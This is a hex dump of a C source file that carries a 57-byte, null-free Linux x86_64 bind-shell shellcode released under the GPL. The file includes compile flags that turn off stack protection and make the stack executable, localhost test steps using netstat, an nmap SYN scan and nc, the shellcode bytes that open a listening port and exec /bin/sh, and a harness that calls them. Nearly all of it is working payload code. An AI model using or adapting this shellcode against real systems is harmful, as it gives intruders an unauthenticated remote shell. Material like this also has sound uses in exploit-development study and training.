00000000  2f 2a 0a 0a 20 53 68 65  6c 6c 20 42 69 6e 64 20  |/*.. Shell Bind |
00000010  54 43 50 20 52 61 6e 64  6f 6d 20 50 6f 72 74 20  |TCP Random Port |
00000020  53 68 65 6c 6c 63 6f 64  65 20 2d 20 43 20 4c 61  |Shellcode - C La|
00000030  6e 67 75 61 67 65 20 2d  20 4c 69 6e 75 78 2f 78  |nguage - Linux/x|
00000040  38 36 5f 36 34 0a 20 43  6f 70 79 72 69 67 68 74  |86_64. Copyright|
00000050  20 28 43 29 20 32 30 31  33 20 47 65 79 73 6c 61  | (C) 2013 Geysla|
00000060  6e 20 47 2e 20 42 65 6d  2c 20 48 61 63 6b 69 6e  |n G. Bem, Hackin|
00000070  67 20 62 69 74 73 0a 0a  20 20 20 68 74 74 70 3a  |g bits..   http:|
00000080  2f 2f 68 61 63 6b 69 6e  67 62 69 74 73 2e 63 6f  |//hackingbits.co|
00000090  6d 0a 20 20 20 67 65 79  73 6c 61 6e 40 67 6d 61  |m.   geyslan@gma|
000000a0  69 6c 2e 63 6f 6d 0a 0a  20 54 68 69 73 20 70 72  |il.com.. This pr|
000000b0  6f 67 72 61 6d 20 69 73  20 66 72 65 65 20 73 6f  |ogram is free so|
000000c0  66 74 77 61 72 65 3a 20  79 6f 75 20 63 61 6e 20  |ftware: you can |
000000d0  72 65 64 69 73 74 72 69  62 75 74 65 20 69 74 20  |redistribute it |
000000e0  61 6e 64 2f 6f 72 20 6d  6f 64 69 66 79 0a 20 69  |and/or modify. i|
000000f0  74 20 75 6e 64 65 72 20  74 68 65 20 74 65 72 6d  |t under the term|
00000100  73 20 6f 66 20 74 68 65  20 47 4e 55 20 47 65 6e  |s of the GNU Gen|
00000110  65 72 61 6c 20 50 75 62  6c 69 63 20 4c 69 63 65  |eral Public Lice|
00000120  6e 73 65 20 61 73 20 70  75 62 6c 69 73 68 65 64  |nse as published|
00000130  20 62 79 0a 20 74 68 65  20 46 72 65 65 20 53 6f  | by. the Free So|
00000140  66 74 77 61 72 65 20 46  6f 75 6e 64 61 74 69 6f  |ftware Foundatio|
00000150  6e 2c 20 65 69 74 68 65  72 20 76 65 72 73 69 6f  |n, either versio|
00000160  6e 20 33 20 6f 66 20 74  68 65 20 4c 69 63 65 6e  |n 3 of the Licen|
00000170  73 65 2c 20 6f 72 0a 20  28 61 74 20 79 6f 75 72  |se, or. (at your|
00000180  20 6f 70 74 69 6f 6e 29  20 61 6e 79 20 6c 61 74  | option) any lat|
00000190  65 72 20 76 65 72 73 69  6f 6e 2e 0a 0a 20 54 68  |er version... Th|
000001a0  69 73 20 70 72 6f 67 72  61 6d 20 69 73 20 64 69  |is program is di|
000001b0  73 74 72 69 62 75 74 65  64 20 69 6e 20 74 68 65  |stributed in the|
000001c0  20 68 6f 70 65 20 74 68  61 74 20 69 74 20 77 69  | hope that it wi|
000001d0  6c 6c 20 62 65 20 75 73  65 66 75 6c 2c 0a 20 62  |ll be useful,. b|
000001e0  75 74 20 57 49 54 48 4f  55 54 20 41 4e 59 20 57  |ut WITHOUT ANY W|
000001f0  41 52 52 41 4e 54 59 3b  20 77 69 74 68 6f 75 74  |ARRANTY; without|
00000200  20 65 76 65 6e 20 74 68  65 20 69 6d 70 6c 69 65  | even the implie|
00000210  64 20 77 61 72 72 61 6e  74 79 20 6f 66 0a 20 4d  |d warranty of. M|
00000220  45 52 43 48 41 4e 54 41  42 49 4c 49 54 59 20 6f  |ERCHANTABILITY o|
00000230  72 20 46 49 54 4e 45 53  53 20 46 4f 52 20 41 20  |r FITNESS FOR A |
00000240  50 41 52 54 49 43 55 4c  41 52 20 50 55 52 50 4f  |PARTICULAR PURPO|
00000250  53 45 2e 20 20 53 65 65  20 74 68 65 0a 20 47 4e  |SE.  See the. GN|
00000260  55 20 47 65 6e 65 72 61  6c 20 50 75 62 6c 69 63  |U General Public|
00000270  20 4c 69 63 65 6e 73 65  20 66 6f 72 20 6d 6f 72  | License for mor|
00000280  65 20 64 65 74 61 69 6c  73 2e 0a 0a 20 59 6f 75  |e details... You|
00000290  20 73 68 6f 75 6c 64 20  68 61 76 65 20 72 65 63  | should have rec|
000002a0  65 69 76 65 64 20 61 20  63 6f 70 79 20 6f 66 20  |eived a copy of |
000002b0  74 68 65 20 47 4e 55 20  47 65 6e 65 72 61 6c 20  |the GNU General |
000002c0  50 75 62 6c 69 63 20 4c  69 63 65 6e 73 65 0a 20  |Public License. |
000002d0  61 6c 6f 6e 67 20 77 69  74 68 20 74 68 69 73 20  |along with this |
000002e0  70 72 6f 67 72 61 6d 2e  20 20 49 66 20 6e 6f 74  |program.  If not|
000002f0  2c 20 73 65 65 20 3c 68  74 74 70 3a 2f 2f 77 77  |, see <http://ww|
00000300  77 2e 67 6e 75 2e 6f 72  67 2f 6c 69 63 65 6e 73  |w.gnu.org/licens|
00000310  65 73 2f 3e 0a 0a 2a 2f  0a 0a 0a 2f 2a 0a 0a 20  |es/>..*/.../*.. |
00000320  20 20 73 68 65 6c 6c 5f  62 69 6e 64 5f 74 63 70  |  shell_bind_tcp|
00000330  5f 72 61 6e 64 6f 6d 5f  70 6f 72 74 5f 73 68 65  |_random_port_she|
00000340  6c 6c 63 6f 64 65 5f 78  38 36 5f 36 34 0a 20 20  |llcode_x86_64.  |
00000350  20 20 20 61 73 73 65 6d  62 6c 79 20 73 6f 75 72  |   assembly sour|
00000360  63 65 3a 20 68 74 74 70  73 3a 2f 2f 67 69 74 68  |ce: https://gith|
00000370  75 62 2e 63 6f 6d 2f 67  65 79 73 6c 61 6e 2f 53  |ub.com/geyslan/S|
00000380  4c 41 45 2f 62 6c 6f 62  2f 6d 61 73 74 65 72 2f  |LAE/blob/master/|
00000390  69 6d 70 72 6f 76 65 6d  65 6e 74 73 2f 73 68 65  |improvements/she|
000003a0  6c 6c 5f 62 69 6e 64 5f  74 63 70 5f 72 61 6e 64  |ll_bind_tcp_rand|
000003b0  6f 6d 5f 70 6f 72 74 5f  78 38 36 5f 36 34 2e 61  |om_port_x86_64.a|
000003c0  73 6d 0a 0a 20 20 20 2a  20 35 37 20 62 79 74 65  |sm..   * 57 byte|
000003d0  73 0a 20 20 20 2a 20 6e  75 6c 6c 2d 66 72 65 65  |s.   * null-free|
000003e0  0a 0a 0a 20 20 20 23 20  67 63 63 20 2d 6d 36 34  |...   # gcc -m64|
000003f0  20 2d 66 6e 6f 2d 73 74  61 63 6b 2d 70 72 6f 74  | -fno-stack-prot|
00000400  65 63 74 6f 72 20 2d 7a  20 65 78 65 63 73 74 61  |ector -z execsta|
00000410  63 6b 20 73 68 65 6c 6c  5f 62 69 6e 64 5f 74 63  |ck shell_bind_tc|
00000420  70 5f 72 61 6e 64 6f 6d  5f 70 6f 72 74 5f 73 68  |p_random_port_sh|
00000430  65 6c 6c 63 6f 64 65 5f  78 38 36 5f 36 34 2e 63  |ellcode_x86_64.c|
00000440  20 2d 6f 20 73 68 65 6c  6c 5f 62 69 6e 64 5f 74  | -o shell_bind_t|
00000450  63 70 5f 72 61 6e 64 6f  6d 5f 70 6f 72 74 5f 73  |cp_random_port_s|
00000460  68 65 6c 6c 63 6f 64 65  5f 78 38 36 5f 36 34 0a  |hellcode_x86_64.|
00000470  0a 20 20 20 54 65 73 74  69 6e 67 0a 20 20 20 23  |.   Testing.   #|
00000480  20 2e 2f 73 68 65 6c 6c  5f 62 69 6e 64 5f 74 63  | ./shell_bind_tc|
00000490  70 5f 72 61 6e 64 6f 6d  5f 70 6f 72 74 5f 73 68  |p_random_port_sh|
000004a0  65 6c 6c 63 6f 64 65 5f  78 38 36 5f 36 34 0a 20  |ellcode_x86_64. |
000004b0  20 20 23 20 6e 65 74 73  74 61 74 20 2d 61 6e 70  |  # netstat -anp|
000004c0  20 7c 20 67 72 65 70 20  73 68 65 6c 6c 0a 20 20  | | grep shell.  |
000004d0  20 23 20 6e 6d 61 70 20  2d 73 53 20 31 32 37 2e  | # nmap -sS 127.|
000004e0  30 2e 30 2e 31 20 2d 70  2d 20 20 28 49 74 27 73  |0.0.1 -p-  (It's|
000004f0  20 6e 65 63 65 73 73 61  72 79 20 74 6f 20 75 73  | necessary to us|
00000500  65 20 74 68 65 20 54 43  50 20 53 59 4e 20 73 63  |e the TCP SYN sc|
00000510  61 6e 20 6f 70 74 69 6f  6e 20 5b 2d 73 53 5d 3b  |an option [-sS];|
00000520  20 74 68 75 73 20 61 76  6f 69 64 73 20 74 68 61  | thus avoids tha|
00000530  74 20 6e 6d 61 70 20 63  6f 6e 6e 65 63 74 73 20  |t nmap connects |
00000540  74 6f 20 74 68 65 20 70  6f 72 74 20 6f 70 65 6e  |to the port open|
00000550  20 62 79 20 73 68 65 6c  6c 63 6f 64 65 29 0a 20  | by shellcode). |
00000560  20 20 23 20 6e 63 20 31  32 37 2e 30 2e 30 2e 31  |  # nc 127.0.0.1|
00000570  20 70 6f 72 74 0a 0a 2a  2f 0a 0a 0a 23 69 6e 63  | port..*/...#inc|
00000580  6c 75 64 65 20 3c 73 74  64 69 6f 2e 68 3e 0a 23  |lude <stdio.h>.#|
00000590  69 6e 63 6c 75 64 65 20  3c 73 74 72 69 6e 67 2e  |include <string.|
000005a0  68 3e 0a 0a 75 6e 73 69  67 6e 65 64 20 63 68 61  |h>..unsigned cha|
000005b0  72 20 63 6f 64 65 5b 5d  20 3d 20 5c 0a 0a 22 5c  |r code[] = \.."\|
000005c0  78 34 38 5c 78 33 31 5c  78 66 36 5c 78 34 38 5c  |x48\x31\xf6\x48\|
000005d0  78 66 37 5c 78 65 36 5c  78 66 66 5c 78 63 36 5c  |xf7\xe6\xff\xc6\|
000005e0  78 36 61 5c 78 30 32 22  0a 22 5c 78 35 66 5c 78  |x6a\x02"."\x5f\x|
000005f0  62 30 5c 78 32 39 5c 78  30 66 5c 78 30 35 5c 78  |b0\x29\x0f\x05\x|
00000600  35 32 5c 78 35 65 5c 78  35 30 5c 78 35 66 5c 78  |52\x5e\x50\x5f\x|
00000610  62 30 22 0a 22 5c 78 33  32 5c 78 30 66 5c 78 30  |b0"."\x32\x0f\x0|
00000620  35 5c 78 62 30 5c 78 32  62 5c 78 30 66 5c 78 30  |5\xb0\x2b\x0f\x0|
00000630  35 5c 78 35 37 5c 78 35  65 5c 78 34 38 22 0a 22  |5\x57\x5e\x48"."|
00000640  5c 78 39 37 5c 78 66 66  5c 78 63 65 5c 78 62 30  |\x97\xff\xce\xb0|
00000650  5c 78 32 31 5c 78 30 66  5c 78 30 35 5c 78 37 35  |\x21\x0f\x05\x75|
00000660  5c 78 66 38 5c 78 35 32  22 0a 22 5c 78 34 38 5c  |\xf8\x52"."\x48\|
00000670  78 62 66 5c 78 32 66 5c  78 32 66 5c 78 36 32 5c  |xbf\x2f\x2f\x62\|
00000680  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x69\x6e\x2f\x73\|
00000690  78 36 38 22 0a 22 5c 78  35 37 5c 78 35 34 5c 78  |x68"."\x57\x54\x|
000006a0  35 66 5c 78 62 30 5c 78  33 62 5c 78 30 66 5c 78  |5f\xb0\x3b\x0f\x|
000006b0  30 35 22 3b 0a 0a 6d 61  69 6e 20 28 29 0a 7b 0a  |05";..main ().{.|
000006c0  0a 20 20 20 20 2f 2f 20  57 68 65 6e 20 63 6f 6e  |.    // When con|
000006d0  74 61 69 6e 73 20 6e 75  6c 6c 20 62 79 74 65 73  |tains null bytes|
000006e0  2c 20 70 72 69 6e 74 66  20 77 69 6c 6c 20 73 68  |, printf will sh|
000006f0  6f 77 20 61 20 77 72 6f  6e 67 20 73 68 65 6c 6c  |ow a wrong shell|
00000700  63 6f 64 65 20 6c 65 6e  67 74 68 2e 0a 0a 20 20  |code length...  |
00000710  20 20 70 72 69 6e 74 66  28 22 53 68 65 6c 6c 63  |  printf("Shellc|
00000720  6f 64 65 20 4c 65 6e 67  74 68 3a 20 20 25 64 5c  |ode Length:  %d\|
00000730  6e 22 2c 20 73 74 72 6c  65 6e 28 63 6f 64 65 29  |n", strlen(code)|
00000740  29 3b 0a 0a 20 20 20 20  2f 2f 20 50 6f 6c 6c 75  |);..    // Pollu|
00000750  74 65 73 20 61 6c 6c 20  72 65 67 69 73 74 65 72  |tes all register|
00000760  73 20 65 6e 73 75 72 69  6e 67 20 74 68 61 74 20  |s ensuring that |
00000770  74 68 65 20 73 68 65 6c  6c 63 6f 64 65 20 72 75  |the shellcode ru|
00000780  6e 73 20 69 6e 20 61 6e  79 20 63 69 72 63 75 6d  |ns in any circum|
00000790  73 74 61 6e 63 65 2e 0a  0a 20 20 20 20 5f 5f 61  |stance...    __a|
000007a0  73 6d 5f 5f 20 28 22 6d  6f 76 20 24 30 78 66 66  |sm__ ("mov $0xff|
000007b0  66 66 66 66 66 66 66 66  66 66 66 66 66 66 2c 20  |ffffffffffffff, |
000007c0  25 72 61 78 5c 6e 5c 74  22 0a 20 20 20 20 20 20  |%rax\n\t".      |
000007d0  20 20 20 22 6d 6f 76 20  25 72 61 78 2c 20 25 72  |   "mov %rax, %r|
000007e0  62 78 5c 6e 5c 74 22 0a  20 20 20 20 20 20 20 20  |bx\n\t".        |
000007f0  20 22 6d 6f 76 20 25 72  61 78 2c 20 25 72 63 78  | "mov %rax, %rcx|
00000800  5c 6e 5c 74 22 0a 20 20  20 20 20 20 20 20 20 22  |\n\t".         "|
00000810  6d 6f 76 20 25 72 61 78  2c 20 25 72 64 78 5c 6e  |mov %rax, %rdx\n|
00000820  5c 74 22 0a 20 20 20 20  20 20 20 20 20 22 6d 6f  |\t".         "mo|
00000830  76 20 25 72 61 78 2c 20  25 72 73 69 5c 6e 5c 74  |v %rax, %rsi\n\t|
00000840  22 0a 20 20 20 20 20 20  20 20 20 22 6d 6f 76 20  |".         "mov |
00000850  25 72 61 78 2c 20 25 72  64 69 5c 6e 5c 74 22 0a  |%rax, %rdi\n\t".|
00000860  20 20 20 20 20 20 20 20  20 22 6d 6f 76 20 25 72  |         "mov %r|
00000870  61 78 2c 20 25 72 62 70  5c 6e 5c 74 22 0a 0a 20  |ax, %rbp\n\t".. |
00000880  20 20 20 2f 2f 20 43 61  6c 6c 69 6e 67 20 74 68  |   // Calling th|
00000890  65 20 73 68 65 6c 6c 63  6f 64 65 0a 20 20 20 20  |e shellcode.    |
000008a0  20 20 20 20 20 22 63 61  6c 6c 20 63 6f 64 65 22  |     "call code"|
000008b0  29 3b 0a 0a 7d                                    |);..}|
000008b5
